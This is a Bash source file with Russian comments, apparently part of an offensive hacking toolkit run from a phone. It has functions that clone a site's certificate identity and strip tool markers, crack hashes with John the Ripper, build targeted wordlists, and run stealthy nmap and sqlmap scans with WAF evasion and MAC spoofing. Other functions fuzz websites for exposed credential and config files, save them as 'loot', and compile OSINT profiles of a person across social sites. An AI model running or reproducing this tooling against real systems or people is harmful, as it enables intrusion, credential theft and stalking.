    # Слой 2: Валидация OpenSSL через Мозг [5]
    core_engine_validator "pkg" "openssl" "OpenSSL Core" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Прием цели
    local target=$(core_engine_input "text" "Enter Target (Domain, IP, File or 'new')")
    [[ -z "$target" ]] && return

    local tmp_data="/tmp/forge_$(date +%s).tmp"
    
    # --- СЛОЙ 4: ЭВРИСТИЧЕСКИЙ ЗАХВАТ (Analysis) ---
    core_engine_ui "i" "Ingesting cryptographic signals..."

    # Попытка захвата DNA через Глушитель [7]
    if [[ "$target" != "new" ]]; then
        { cat "$target" 2>/dev/null || \
          timeout 5 openssl s_client -connect "${target}:443" -servername "$target" </dev/null 2>/dev/null | openssl x509; \
        } > "$tmp_data" 2>/dev/null
    fi

    # --- СЛОЙ 5: АВТОМАТИЧЕСКИЙ ВЫБОР РЕЖИМА ---
    local mode="CREATE"
    [[ -s "$tmp_data" ]] && mode="MIRROR"
    core_engine_ui "s" "Mode Identified: $mode"

    local subj algo opt
    case "$mode" in
        "MIRROR")
            core_engine_ui "w" "Cloning target DNA for $target..."
            local cert_text=$(openssl x509 -in "$tmp_data" -text -noout)
            subj=$(echo "$cert_text" | grep "subject=" | sed 's/^subject= //; s/^subject=//')
            # Эвристика алгоритма
            if echo "$cert_text" | grep -qiE "RSA.*(2048|4096)"; then
                algo="rsa:2048"
                opt=""
            else
                algo="ec"
                opt="-pkeyopt ec_paramgen_curve:prime256v1"
            fi
            ;;
        "CREATE")
            core_engine_ui "i" "Initializing fresh identity Forge..."
            subj="/C=US/O=Prime_Intelligence/CN=${target:-prime.local}"
            algo="rsa:2048"
            opt=""
            ;;
    esac

    # --- СЛОЙ 6: ЕДИНАЯ КОВКА (Unified Forge) ---
    local loot_dir="${BASE_DIR:-./}/prime_loot"
    local safe_name=$(echo "$target" | tr '.' '_')
    local out_base="$loot_dir/${safe_name}_forge"
    
    # Генерация через Глушитель [7]
    if openssl req -x509 -newkey "$algo" $opt -nodes -days 365 \
        -subj "$subj" -keyout "${out_base}.key" -out "${out_base}.crt" 2>/dev/null; then
        
        # Стелс-зачистка через Санитара [8] (удаление меток инструмента)
        sed -i '/OpenSSL/d' "${out_base}.crt" 2>/dev/null
        
        core_engine_ui "+" "Cryptographic Artifact Synthesized."
        echo -e "${W}Key: ${out_base}.key\nCrt: ${out_base}.crt${NC}"
        
        # Сбор трофеев [11] и сигнал для Моста [10]
        core_engine_loot "crypto" "Generated $mode certificate for $target (Algo: $algo)"
        echo "[$(date)] CRYPTO_FORGE: $mode Success | Target: $target" >> "$loot_dir/bridge_signals.log"
    else
        core_engine_ui "e" "Forge rejected the sequence."
    fi

    # Очистка через Санитара [8]
    core_engine_remove "$tmp_data"
    core_engine_wait
}

# ==============================================================================
# @description: Глобальный модуль аудита парольной безопасности v15.0
# МОДЕРНИЗАЦИЯ: Интеграция со строгими символьными матрицами и regex-ядра
# ФУНКЦИОНАЛ: Генерация по маске, вычисление энтропии Шеннона, автономный Crunch
# АРХИТЕКТУРА: 100% чистый Bash, нулевая зависимость от сторонних бинарников
# ==============================================================================
run_pass_lab() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "h" "PRIME PASSWORD SECURITY LABORATORY v15.0"

    core_engine_item "1" "GENERATE" "Create High-Entropy Password"
    core_engine_item "2" "AUDIT"    "Evaluate Password Strength & Entropy"
    core_engine_item "3" "SMART CRUNCH" "Global Matrix Wordlist Generator"
    core_engine_item "B" "BACK"     "Return to Main Menu"
    
    local choice=$(core_engine_input "select" "Select Operation Mode")
    [[ -z "$choice" || "$choice" == "b" || "$choice" == "B" ]] && return

    case "$choice" in
        "1") # --- ВЕТКА 1: КРИПТОСТОЙКАЯ ГЕНЕРАЦИЯ ИЗ ГЛОБАЛЬНЫХ МАТРИЦ ---
            core_engine_ui "i" "Password Complexity Level:"
            core_engine_item "1" "STANDARD" "Alphanumeric (Global Alpha + Num)"
            core_engine_item "2" "ULTIMATE" "Maximum Entropy (Alpha + Num + Spec)"
            local g_mode=$(core_engine_input "select" "Complexity Type")
            
            local len=$(core_engine_input "text" "Enter Length (Default: $PASS_LAB_DEFAULT_LEN)")
            len=${len:-$PASS_LAB_DEFAULT_LEN}
            
            if [[ $len -lt 8 ]]; then
                core_engine_ui "w" "Length too short for safety! Force-adjusting to 8."
                len=8
            fi

            local secure_pass=""
            if [[ "$g_mode" == "1" ]]; then
                secure_pass=$(tr -dc "${GLOBAL_LAB_CHARSET_ALPHA}${GLOBAL_LAB_CHARSET_NUM}" < /dev/urandom | head -c "$len")
            else
                secure_pass=$(tr -dc "${GLOBAL_LAB_CHARSET_ALPHA}${GLOBAL_LAB_CHARSET_NUM}${GLOBAL_LAB_CHARSET_SPEC}" < /dev/urandom | head -c "$len")
            fi

            core_engine_ui "s" "SECURE ARTIFACT GENERATED"
            core_engine_ui "line" ""
            echo -e "${W}Generated Password : ${Y}$secure_pass${NC}"
            
            if command -v mkpasswd >/dev/null 2>&1; then
                local b_hash=$(echo -n "$secure_pass" | mkpasswd -m bcrypt 2>/dev/null)
                [[ -n "$b_hash" ]] && echo -e "${G}Local Bcrypt Hash  : ${NC}$b_hash"
            fi
            core_engine_ui "line" ""
            core_engine_loot "pass_vault" "Length: $len | Generated from Global Matrix"
            ;;

        "2") # --- ВЕТКА 2: МАТЕМАТИЧЕСКИЙ АНАЛИЗАТОР ЭНТРОПИИ И РЕГЕКСОВ ---
            local check_pass=$(core_engine_input "text" "Enter Password to Audit")
            [[ -z "$check_pass" ]] && return

            local p_len=${#check_pass}
            local charset_size=0

            # Строгая валидация состава символов через регулярные выражения ядра
            [[ "$check_pass" =~ $GLOBAL_REGEX_PASS_LOW ]] && charset_size=$((charset_size + 26))
            [[ "$check_pass" =~ $GLOBAL_REGEX_PASS_UP ]]  && charset_size=$((charset_size + 26))
            [[ "$check_pass" =~ $GLOBAL_REGEX_PASS_NUM ]] && charset_size=$((charset_size + 10))
            [[ "$check_pass" =~ $GLOBAL_REGEX_PASS_SPEC ]] && charset_size=$((charset_size + 32))

            local entropy_score=0
            if [[ $charset_size -gt 0 ]]; then
                if [[ $charset_size -le 10 ]]; then entropy_score=$((p_len * 3))
                elif [[ $charset_size -le 36 ]]; then entropy_score=$((p_len * 5))
                elif [[ $charset_size -le 62 ]]; then entropy_score=$((p_len * 6))
                else entropy_score=$((p_len * 7))
                fi
            fi

            core_engine_ui "h" "ENTROPY AUDIT REPORT"
            echo -e "${W}Password Length:${NC} $p_len characters"
            echo -e "${W}Pool Size (R)  :${NC} $charset_size unique symbols"
            echo -e "${W}Est. Entropy   :${NC} ~$entropy_score bits"

            core_engine_ui "line" ""
            if [[ $entropy_score -lt 40 ]]; then
                core_engine_ui "e" "CRITICAL: Weak password! Vulnerable to rapid dictionary synthesis."
            elif [[ $entropy_score -lt 70 ]]; then
                core_engine_ui "w" "WARNING: Moderate strength. Expand charset or increase length."
            else
                core_engine_ui "s" "SUCCESS: Verified military-grade entropy core."
            fi
            core_engine_ui "line" ""
            ;;

        "3") # --- ВЕТКА 3: АВТОНОМНЫЙ CRUNCH С ПАРСИНГОМ МАТРИЦЫ ---
            core_engine_ui "i" "Smart Dictionary Compiler Setup"
            core_engine_item "1" "MANUAL" "Enter custom base word/prefix"
            core_engine_item "2" "MATRIX" "Use Core Global Prefixes Array"
            local p_choice=$(core_engine_input "select" "Prefix Strategy")

            local active_prefixes=()
            if [[ "$p_choice" == "2" ]]; then
                # Парсим глобальный массив, вытаскивая только левую часть до разделителя '|'
                for item in "${GLOBAL_PASS_PREFIXES[@]}"; do
                    local pure_prefix=$(echo "$item" | cut -d'|' -f1)
                    active_prefixes+=("$pure_prefix")
                done
                core_engine_ui "+" "Parsed ${#active_prefixes[@]} base vectors from global blockchain/auth style core."
            else
                local manual_p=$(core_engine_input "text" "Enter Base String (e.g., node)")
                [[ -z "$manual_p" ]] && manual_p="admin"
                active_prefixes+=("$manual_p")
            fi

            local num_digits=$(core_engine_input "text" "Trailing digital depth (1-$PASS_LAB_MAX_DIGITS, Default: 3)")
            num_digits=${num_digits:-3}

            if [[ ! "$num_digits" =~ ^[1-6]$ ]] || [[ $num_digits -gt $PASS_LAB_MAX_DIGITS ]]; then
                core_engine_ui "e" "Out of safe range. Limiting to 3 for flash-memory protection."
                num_digits=3
            fi

            local out_file="${BASE_DIR:-./}/prime_loot/smart_wordlist_$(date +%s).txt"
            core_engine_progress 1 "COMPILING_GLOBAL_COMBINATIONS"

            local max_num=$(( 10**num_digits - 1 ))
            local fmt="%0${num_digits}d"
            local total_generated=0

            # Стерильная высокоскоростная генерация на лету
            {
                for prefix in "${active_prefixes[@]}"; do
                    for ((i=0; i<=max_num; i++)); do
                        printf "${prefix}${fmt}\n" "$i"
                        ((total_generated++))
                    done
                done
            } > "$out_file"

            core_engine_ui "s" "COMPILATION COMPLETE"
            echo -e "${G} >> Target File:${NC} $(basename "$out_file")"
            echo -e "${G} >> Total Items:${NC} $total_generated structural vectors"
            
            core_engine_loot "global_crunch" "Compiled $total_generated items from global matrices."
            ;;
    esac

    core_engine_wait
}


run_pass_labold() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME PASSWORD LABORATORY v13.8"

    local target_hash="$1"
    local choice

    # Слой 2: Органы чувств [3] — Определение режима
    if [[ -z "$target_hash" ]]; then
        core_engine_item "1" "GENERATE" "Create Secure Password"
        core_engine_item "2" "CRUNCH" "Wordlist Generator"
        core_engine_item "3" "DECRYPT" "Hash Cracking"
        core_engine_item "B" "BACK" "Return"
        choice=$(core_engine_input "select" "Select Operation Mode")
    else
        # Если данные пришли из Bridge, сразу переходим к дешифровке
        choice="3"
        core_engine_ui "i" "Hash signal received from Bridge. Initializing Decryptor..."
    fi

    [[ -z "$choice" || "$choice" == "b" ]] && return

    case "$choice" in
        "1") # --- ВЕТКА GENERATE ---
            core_engine_item "1" "PHONETIC" "Easy to remember (pwgen)"
            core_engine_item "2" "COMPLEX" "Maximum entropy (urandom)"
            local g_mode=$(core_engine_input "select" "Generation Type")

            local len=$(core_engine_input "text" "Enter Length (Default: 16)")
            len=${len:-16}
            
            local pass=""
            if [[ "$g_mode" == "1" ]]; then
                # Проверка наличия pwgen через Мозг [5]
                core_engine_validator "pkg" "pwgen" "pwgen" && pass=$(pwgen -s "$len" 1)
            else
                pass=$(tr -dc 'A-Za-z0-9!@#$%^&*()_+=' < /dev/urandom | head -c "$len")
            fi

            core_engine_ui "+" "ARTIFACT GENERATED"
            echo -e "${W}Password: ${Y}$pass${NC}"
            
            # Мутация через Мозг [5]
            if core_engine_validator "read" "Apply Bcrypt mutation?"; then
                local b_hash=$(echo -n "$pass" | mkpasswd -m bcrypt -s 2>/dev/null || echo "Error: mkpasswd missing")
                echo -e "${G}Bcrypt Hash: ${NC}$b_hash"
                core_engine_loot "pass_gen" "Pass: $pass | Hash: $b_hash"
            fi
            ;;

        "2") # --- ВЕТКА CRUNCH ---
            # Валидация Crunch через Мозг [5]
            core_engine_validator "pkg" "crunch" "Crunch" || { core_engine_wait; return; }
            
            core_engine_ui "i" "Crunch Syntax: [min] [max] [charset]"
            local c_params=$(core_engine_input "text" "Enter Parameters (e.g., 4 6 abc12)")
            [[ -z "$c_params" ]] && return
            
            local out_file="${BASE_DIR:-./}/prime_loot/wordlist_$(date +%s).txt"
            core_engine_ui "w" "Generating wordlist to: $(basename "$out_file")"
            
            # Исполнение через Глушитель [7]
            core_engine_run "crunch $c_params -o $out_file" "Crunching Entropy"
            core_engine_ui "+" "Done. Signals saved to loot."
            ;;

        "3") # --- ВЕТКА DECRYPT (Интеграция с John) ---
            local hash_to_crack="${target_hash:-$(core_engine_input "text" "Enter Hash to Decrypt")}"
            [[ -z "$hash_to_crack" ]] && return
            
            core_engine_ui "!" "Initializing John the Ripper Engine..."
            # Сохраняем хеш во временный файл через Санитара [8]
            local tmp_h="/tmp/h_$(date +%s)"
            echo "$hash_to_crack" > "$tmp_h"
            
            # Проверка John через Мозг [5]
            if core_engine_validator "pkg" "john" "John the Ripper"; then
                core_engine_run "john $tmp_h" "Cracking Sequence"
                local result=$(john --show "$tmp_h" | head -n 1)
                
                core_engine_ui "+" "Cracking Cycle Finished."
                echo -e "${W}Result: ${Y}${result:-No match found}${NC}"
                
                [[ -n "$result" ]] && core_engine_loot "cracked_hashes" "Hash: $hash_to_crack | Result: $result"
            fi
            core_engine_remove "$tmp_h"
            ;;
    esac

    core_engine_wait
}


# ==============================================================================
# @description: Эвристический сканер уязвимостей (GHOST-ENGINE INTEG v7.2)
# ==============================================================================
run_prime_exploiter_v5() {
    clear
    # Слой 1: Заголовок ядра
    core_engine_ui "h" "PRIME HEURISTIC VULN-SCANNER v7.2"

    # Слой 2: Прием цели
    local target=$(core_engine_input "text" "Enter Target Domain/URL")
    [[ -z "$target" ]] && return

    # Подготовка путей согласно архитектуре ядра
    local loot_dir="$BASE_DIR/loot"
    mkdir -p "$loot_dir"
    local results_file="$loot_dir/vuln_$(date +%s).log"
    local signals_file="/tmp/signals_$RANDOM.tmp"

    # --- СЛОЙ 1: ПАССИВНЫЙ ГЕНЕРАТОР СИГНАЛОВ ---
    core_engine_ui "i" "Ingesting target aura (Passive Mode)..."

    # Сбор данных с использованием глобального User-Agent ядра
    {
        curl -Is --connect-timeout 5 -A "$GLOBAL_NETWORK_UA" "$target"
        host -t txt "$target" 2>/dev/null
        whois "$target" 2>/dev/null | grep -iE "city|country|orgname"
    } > "$signals_file" 2>&1

    # --- СЛОЙ 2: АДАПТИВНАЯ МАТРИЦА (Мозг системы) ---
    local entropy_level=$(wc -c < "$signals_file")
    local stealth_delay=$(( (entropy_level % 5) + 2 ))

    # Эвристический выбор модулей на основе глобальных сигнатур веб-структуры
    local sql_engine="dormant"
    grep -qiE "$GLOBAL_SIG_WEB_STRUCTURE" "$signals_file" && sql_engine="active"

    # Адаптивное управление интенсивностью при обнаружении WAF через глобальные сигнатуры
    local scan_intensity="-T3"
    grep -qiE "$GLOBAL_SIG_WAF" "$signals_file" && scan_intensity="-T1 --spoof-mac 0"

    # --- СЛОЙ 3: ЦИКЛ АМОРФНОГО ИСПОЛНЕНИЯ ---
    core_engine_ui "w" "Deploying Ghost-Engine (Intensity: $scan_intensity)..."

    # Запуск параллельного фонового процесса сбора артефактов
    (
        nmap $scan_intensity -n -Pn --version-intensity 0 "$target" >> "$results_file" 2>&1

        if [[ "$sql_engine" == "active" ]]; then
            # Адаптивный вызов sqlmap с автоматическими параметрами безопасности
            sqlmap -u "$target" --batch --random-agent --delay="$stealth_delay" \
                  --threads=1 >> "$results_file" 2>&1
        fi
    ) &

    # Визуализация прогресса
    core_engine_progress 10 "Processing heuristic feedback loops"

    # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
    core_engine_wait "L"
    core_engine_ui "s" "INTELLIGENCE SYNTHESIS COMPLETE"

    # Парсинг результатов через Валидатор с использованием глобальных алертов уязвимостей
    if [[ -s "$results_file" ]]; then
        grep -Ei "$GLOBAL_SIG_VULN_ALERTS" "$results_file" | \
        sed -r "s/(.*vulnerable.*)/\1 ${Y}[HIGH PRIORITY]${NC}/" | sort -u

        # Интеграция в Сборщик трофеев ядра
        core_engine_loot "vulnerabilities" "Target: $target | Entropy: $entropy_level\n$(cat "$results_file")"
    else
        core_engine_ui "e" "No significant anomalies detected in initial scan."
    fi

    # Сигнал для Моста логов
    echo "[$(date)] VULN_SCAN: $target | ENTROPY: $entropy_level" >> "$loot_dir/bridge_signals.log"

    # Очистка временных файлов через Санитара
    rm -f "$signals_file"
    core_engine_wait
}

# ==============================================================================
# @description: Единый конвейер автоматической корреляции, сборки и экспорта
# ==============================================================================
run_nexus_full_pipeline() {
    core_engine_ui "h" "NEXUS CORRELATION: FULL PIPELINE AUTOMATION"
    
    # 1. Захват и верификация цели
    local current_target="${target_user:-"general_target"}"
    core_engine_ui "i" "Инициализация сквозного анализа для объекта: [$current_target]"
    echo "------------------------------------------------------------------"

    local timestamp
    timestamp=$(date +'%Y%m%d_%H%M')
    
    # Пути для сохранения артефактов
    local prime_loot_dir="$HOME/prime_loot"
    local archive_dir="$prime_loot_dir/archives"
    local target_report="$prime_loot_dir/nexus_report_${current_target}_${timestamp}.md"
    local archive_file="$archive_dir/loot_${current_target}_${timestamp}.tar.gz"
    local export_path="/sdcard/Download"

    mkdir -p "$prime_loot_dir" "$archive_dir"

    # ==========================================
    # ЭТАП 1: ARTIFACT LINKER (Глубокая линковка)
    # ==========================================
    core_engine_ui "i" "[Этап 1/4] Сшивание логов и построение паспорта объекта..."
    
    echo "==================================================================" > "$target_report"
    echo "  NEXUS INTEGRATED INTELLIGENCE REPORT: $current_target" >> "$target_report"
    echo "  GENERATED: $(date +'%Y-%m-%d %H:%M:%S')" >> "$target_report"
    echo "==================================================================" >> "$target_report"

    if ls "$prime_loot_dir"/*"${current_target}"* 1>/dev/null 2>&1; then
        find "$prime_loot_dir" -type f -name "*${current_target}*" | while read -r file; do
            if [[ "$file" != *"/nexus_report_"* && "$file" != *"/archives/"* ]]; then
                echo -e "\n### АНАЛИЗ ИСТОЧНИКА: $(basename "$file")" >> "$target_report"
                echo "--------------------------------------------------" >> "$target_report"
                while read -r line; do
                    if [[ -n "$line" ]]; then
                        echo "  * $line" >> "$target_report"
                    fi
                done < "$file"
            fi
        done
        core_engine_ui "s" "[+] Сводный цифровой профиль успешно сгенерирован."
    else
        core_engine_ui "w" "[!] Первичные логи отсутствуют. Создан пустой бланк отчета."
        echo "[-] Локальные сырые логи для построения профиля отсутствуют." >> "$target_report"
    fi

    # ==========================================
    # ЭТАП 2: KNOWLEDGE GRAPH (Топология связей)
    # ==========================================
    echo "------------------------------------------------------------------"
    core_engine_ui "i" "[Этап 2/4] Визуализация семантической карты..."
    
    echo "  [ ТОПОЛОГИЯ ЦИФРОВОГО СЛЕДА ОБЪЕКТА: $current_target ]"
    echo "                      "

    # Динамический сбор категориальных групп на основе GLOBAL_OSINT_SITES
    local list_social="" list_dev="" list_blog="" list_media="" list_design="" list_gaming="" list_commerce=""

    for entry in "${GLOBAL_OSINT_SITES[@]}"; do
        [[ "$entry" != *"|"* ]] && continue
        local category=$(echo "$entry" | awk -F'|' '{print $4}')
        local service_name=$(echo "$entry" | awk -F'|' '{print $5}')
        [[ -z "$service_name" ]] && continue

        case "$category" in
            "SOCIAL")   list_social="$list_social $service_name" ;;
            "DEV")      list_dev="$list_dev $service_name" ;;
            "BLOG")     list_blog="$list_blog $service_name" ;;
            "MEDIA")    list_media="$list_media $service_name" ;;
            "DESIGN")   list_design="$list_design $service_name" ;;
            "GAMING")   list_gaming="$list_gaming $service_name" ;;
            "COMMERCE") list_commerce="$list_commerce $service_name" ;;
        esac
    done

    # Инициализация структуры карты в Markdown-отчете
    echo -e "\n## СЕМАНТИЧЕСКАЯ КАРТА И ТОПОЛОГИЯ СВЯЗЕЙ" >> "$target_report"
    echo "--------------------------------------------------" >> "$target_report"
    echo "```" >> "$target_report"

    # Линейный вывод дерева топологии на экран и логгирование в файл без ANSI-кодов
    local node_str=""

    node_str="       [ ЯДРО ОБЪЕКТА ] ══════> (Идентификатор: ${G}$current_target${NC})"
    echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
    
    node_str="              ║"
    echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"

    if [[ -n $(echo "$list_social" | xargs) ]]; then
        node_str="              ╠═══ [ Сектор: SOCIAL & MESSENGERS ]"
        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
        for item in $list_social; do
            node_str="              ║     ╚═══> ($item)"
            echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
        done
        node_str="              ║"
        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
    fi

    if [[ -n $(echo "$list_dev" | xargs) ]]; then
        node_str="              ╠═══ [ Сектор: DEV & TECH INFRA ]"
        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
        for item in $list_dev; do
            node_str="              ║     ╚═══> ($item)"
            echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
        done
        node_str="              ║"
        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
    fi

    if [[ -n $(echo "$list_blog" | xargs) ]]; then
        node_str="              ╠═══ [ Сектор: BLOGS & FORUMS ]"
        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
        for item in $list_blog; do
            node_str="              ║     ╚═══> ($item)"
            echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
        done
        node_str="              ║"
        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
    fi

    if [[ -n $(echo "$list_media" | xargs) ]]; then
        node_str="              ╠═══ [ Сектор: MEDIA & STREAMING ]"
        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
        for item in $list_media; do
            node_str="              ║     ╚═══> ($item)"
            echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
        done
        node_str="              ║"
        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
    fi

    node_str="              ╚═══ [ Сектор: DESIGN, GAMING & FREELANCE ]"
    echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
    for item in $list_design $list_gaming $list_commerce; do
        node_str="                    ╚═══> ($item)"
        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
    done

    echo "```" >> "$target_report"
    echo ""

    # Вывод критических зацепок на экран (Безопасный grep фиксированных строк)
    if [[ -f "$target_report" ]]; then
        grep -F "->" "$target_report" 2>/dev/null | head -n 10 | while read -r match_line; do
            local clean_display
            clean_display=$(echo "$match_line" | tr -d '*#')
            echo "     [!] ВЫЯВЛЕНА СВЯЗЬ: $clean_display"
        done
    fi

    # ==========================================
    # ЭТАП 3: LOOT COLLECTOR (Архивация)
    # ==========================================
    echo "------------------------------------------------------------------"
    core_engine_ui "i" "[Этап 3/4] Компрессия данных в защищенный архив..."
    
    if ls "$prime_loot_dir"/*"${current_target}"* 1>/dev/null 2>&1; then
        (cd "$prime_loot_dir" && tar -czf "$archive_file" --exclude='archives' *"${current_target}"* 2>/dev/null)
        core_engine_ui "s" "[+] Все файлы упакованы в: $(basename "$archive_file")"
    else
        core_engine_ui "w" "[!] Нет файлов для компрессии."
    fi

    # ==========================================
    # ЭТАП 4: SESSION EXPORT (Выгрузка на накопитель)
    # ==========================================
    echo "------------------------------------------------------------------"
    core_engine_ui "i" "[Этап 4/4] Автоматический экспорт на внешний накопитель..."
    
    if [[ -d "$export_path" ]]; then
        if cp "$target_report" "$export_path/" 2>/dev/null && cp "$archive_file" "$export_path/" 2>/dev/null; then
            core_engine_ui "s" "[УСПЕХ] Все отчеты и архивы скопированы в: $export_path/"
        else
            # Если нет прав доступа к sdcard памяти смартфона
            local backup_export="$HOME/nexus_export"
            mkdir -p "$backup_export"
            cp "$target_report" "$backup_export/" 2>/dev/null
            cp "$archive_file" "$backup_export/" 2>/dev/null
            core_engine_ui "w" "[!] Ограничение прав Termux. Файлы выгружены локально: $backup_export/"
        fi
    else
        core_engine_ui "e" "[-] Внешний каталог $export_path не найден. Результаты сохранены в $prime_loot_dir"
    fi

    echo "------------------------------------------------------------------"
    core_engine_ui "s" "Конвейер полностью завершен! Сессия зафиксирована."
    core_engine_wait
}


# --- PRIME OMEGA AUDITOR v2.5 [GHOST_SPEED] ---
# ==============================================================================
# @description: Вспомогательная функция глубокого анализа исходного кода
# ПОЛНАЯ АВТОНОМИЯ: Глобальный сигнатурный анализ (SAST CORE)
# ==============================================================================
run_deep_file_probe() {
    local host="$1"
    local target_file="$2"
    [[ -z "$host" || -z "$target_file" ]] && return

    core_engine_ui "i" "Deep Probing: $target_file..."
    
    # Загружаем заголовок файла (первые 2кб для анализа структуры)
    local sample=$(curl -s -k -L --max-time 5 "https://$host/$target_file" | head -c 2048)
    local leaks=""
    local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"

    # 1. Эвристика: Поиск утечек СУБД / Конфигов
    if echo "$sample" | grep -qiE "$GLOBAL_REGEX_DB_LEAKS"; then
        leaks+="${R}[!] DB_LEAK: Connection string, config environment or database credentials detected${NC}\n"
    fi

    # 2. Эвристика: Поиск точек входа / Веб-параметров
    if echo "$sample" | grep -qiE "$GLOBAL_REGEX_WEB_INPUTS"; then
        leaks+="${Y}[*] LOGIC: Entry point for data detected (Cross-Platform Web Inputs)${NC}\n"
    fi

    # 3. Эвристика: Поиск системных вызовов (RCE)
    if echo "$sample" | grep -qiE "$GLOBAL_REGEX_RCE_RISKS"; then
        leaks+="${R}[!] RCE_RISK: System command execution detected (Critical Internal Call)${NC}\n"
    fi

    # 4. Эвристика: Поиск файловых операций / Инклудов (LFI)
    if echo "$sample" | grep -qiE "$GLOBAL_REGEX_LFI_RISKS"; then
        leaks+="${B}[i] LFI_RISK: File operations / Dynamic inclusion detected${NC}\n"
    fi

    # Фиксация результатов при обнаружении аномалий
    if [[ -n "$leaks" ]]; then
        echo -e "      |--- ANALYSIS:\n$(echo -e "$leaks" | sed 's/^/      | /')"
        
        # Безопасное сохранение "грязного" файла в лут для ручного разбора
        mkdir -p "$loot_dir"
        echo "$sample" > "$loot_dir/probe_${target_file//\//_}_$(date +%s).php"
    fi
}

# ==============================================================================
# @description: Основной диспетчер верификации конфигурации веб-ресурсов
# ПОЛНАЯ АВТОНОМИЯ: Параллельный движок на базе GLOBAL_FUZZ_WORDLIST и EXTENSIONS
# ==============================================================================
run_prime_auditor_v2() {
    local host="$1"
    local tmp_pipe="/tmp/prime_pipe_$$"
    local tag=""
    local target=""
    local head_check=""
    
    core_engine_ui "h" "OMEGA AUDITOR v5.1 (Deep Probe / Parallel)"

    # 1. ПОЛУЧЕНИЕ ЦЕЛИ
    if [[ -z "$host" ]]; then
        host=$(core_engine_input "text" "Enter Target (Domain or IP)")
    fi
    [[ -z "$host" ]] && return

    # 2. ЭВРИСТИКА БЕЗОПАСНОСТИ
    # Использование глобальных сетевых фильтров изоляции (RFC 1918 / Loopback)
    if [[ "$host" =~ $GLOBAL_REGEX_NET_LOOPBACK ]] || \
       [[ "$host" =~ $GLOBAL_REGEX_NET_PRIVATE_10 ]] || \
       [[ "$host" =~ $GLOBAL_REGEX_NET_PRIVATE_172 ]] || \
       [[ "$host" =~ $GLOBAL_REGEX_NET_PRIVATE_192 ]] || \
       [[ "$host" =~ $GLOBAL_REGEX_NET_LOCAL_NAMES ]]; then
        core_engine_ui "i" "Local target detected. Skipping Anonymity Check."
    else
        core_engine_validator "privacy" "" "Security Shield" || return
    fi

    # 3. ВАЛИДАЦИЯ
    core_engine_validator "url" "$host" "Syntax" || return
    core_engine_validator "net_up" "$host" "Availability" || return

    # 4. ПАРАЛЛЕЛЬНЫЙ ДВИЖОК
    touch "$tmp_pipe"
    core_engine_ui "i" "Deploying Parallel Engines on: $host"

    ( # Поток А: Краулинг контента (Сбор данных по ультимативной глобальной матрице расширений)
        local discovered=$(curl -s -k -L --max-time 5 "https://$host" | grep -oE "$GLOBAL_REGEX_WEB_EXTENSIONS" 2>/dev/null | sort -u)
        for t in $discovered; do 
            echo "HIT|$t" >> "$tmp_pipe"
        done
    ) &

    ( # Поток Б: Скрытые директории/файлы (Итерация по глобальному словарю фаззинга)
        for f in "${GLOBAL_FUZZ_WORDLIST[@]}"; do
            local res=$(curl -s -k -L -I -w "%{http_code}" -o /dev/null --connect-timeout 3 "https://$host/$f")
            [[ "$res" == "200" ]] && echo "HIT|$f" >> "$tmp_pipe"
        done
    ) &

    wait
    
    # 5. ИНТЕЛЛЕКТУАЛЬНЫЙ ЛУТИНГ + DEEP PROBE
    core_engine_ui "line"
    echo -e "${Y}>>> AUDIT REPORT: $host <<<${NC}"

    # Исключение дубликатов и разбор через безопасный дескриптор 'tag'
    while IFS='|' read -r tag target; do
        [[ -z "$target" ]] && continue

        # Фильтрация ложных ответов через ультимативную глобальную сигнатурную матрицу анти-мусора
        head_check=$(curl -s -k -L --max-time 3 "https://$host/$target" | head -c 500)
        if ! echo "$head_check" | grep -qiE "$GLOBAL_REGEX_HOSTING_WASTE"; then
            
            # Классификация БЕЗ ХАРДКОДА: сверка с глобальными паттернами утечек и критических расширений
            if echo "$target" | grep -qiE "$GLOBAL_REGEX_DB_LEAKS" || echo "$target" | grep -qiE "$GLOBAL_REGEX_CRITICAL_EXTS"; then
                core_engine_loot "CRITICAL" "Exposed: $target on $host"
                echo -e "${R}[CRITICAL]${NC} $target"
            else
                echo -e "${G}[FILE]${NC} $target"
            fi

            # --- ЭВРИСТИЧЕСКИЙ ВЫЗОВ DEEP PROBE ---
            # Отправка на глубокий SAST-анализ при совпадении с глобальными типами скриптов и триггерными именами
            if echo "$target" | grep -qiE "$GLOBAL_REGEX_WEB_SCRIPTS" && echo "$target" | grep -qiE "$GLOBAL_REGEX_SUSPICIOUS_NAMES"; then
                run_deep_file_probe "$host" "$target"
            fi
        fi
    done < <(sort -u "$tmp_pipe")

    # Корректное уничтожение временного дескриптора сессии
    rm -f "$tmp_pipe"
    core_engine_ui "line"
    core_engine_wait
}


run_omni_scan() {
    core_engine_ui "h" "OMNI-SCAN ENGINE v1.0 (Autonomous Orchestrator)"
